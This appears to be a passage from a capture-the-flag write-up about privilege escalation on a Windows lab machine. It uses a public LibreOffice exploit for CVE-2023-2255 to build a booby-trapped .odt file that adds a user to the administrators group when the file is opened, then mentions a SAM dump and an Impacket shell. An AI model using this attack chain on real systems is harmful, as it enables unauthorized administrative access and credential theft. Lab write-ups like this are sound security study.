======================================================================
```
There is a CVE affecting this LibreOffice version (https://www.cvedetails.com/cve/CVE-2023-2255/), and an exploit in GitHub (https://github.com/elweth-sec/CVE-2023-2255).<br>

Clone the repository and create a malicious `.odt` file containing a payload to make user `maya` administrator.
```powershell
> python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'important.odt' 
File important.odt has been created !
```
Transfer the file `important.odt` to folder `c:\important documents` and wait till someone opens it. When that happens, then user `mailing\maya` is added into administrators group.
```powershell
> dir

    Directory: C:\important documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          9/6/2024   5:57 PM          30526 important.odt

> net user maya
User name                    maya
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2024-04-12 4:16:20 AM
Password expires             Never
Password changeable          2024-04-12 4:16:20 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2024-09-06 6:01:00 PM

Logon hours allowed          All

Local Group Memberships      *Administradores      *Remote Management Use
                             *Usuarios             *Usuarios de escritori
Global Group memberships     *Ninguno
The command completed successfully.
```
Now we can dump the SAM file remotely using maya's credentials.

![Untitled9](https://github.com/user-attachments/assets/9c656c84-10d7-4b9e-8597-37599dd4ba33)

And open a shell for user `localadmin` with Impacket.

![Untitled10](https://github.com/user-attachments/assets/30fe3f17-af38-42b4-80ff-8c236d4e040f)

You are root.

Note: before closing remove user `maya` from administrators group to leave the house cleaned.
```markdown
> net localgroup Administradores maya /delete
Se ha completado el comando correctamente.

> net user maya
Nombre de usuario                          maya
Nombre completo                            
Comentario                                 
Comentario del usuario                     
Cuenta activa                              S�
La cuenta expira                           Nunca

La contrase�a expira                       Nunca
Cambio de contrase�a                       12/04/2024 4:16:20
Contrase�a requerida                       S�
El usuario puede cambiar la contrase�a     S�

Estaciones de trabajo autorizadas          Todas
Script de inicio de sesi�n                 
Perfil de usuario                          
Directorio principal                       
Ultima sesi�n iniciada                     06/09/2024 18:08:07

Horas de inicio de sesi�n autorizadas      Todas

Miembros del grupo local                   *Remote Management Use
                                           *Usuarios             
                                           *Usuarios de escritori
Miembros del grupo global                  *Ninguno              
Se ha completado el comando correctamente.
```
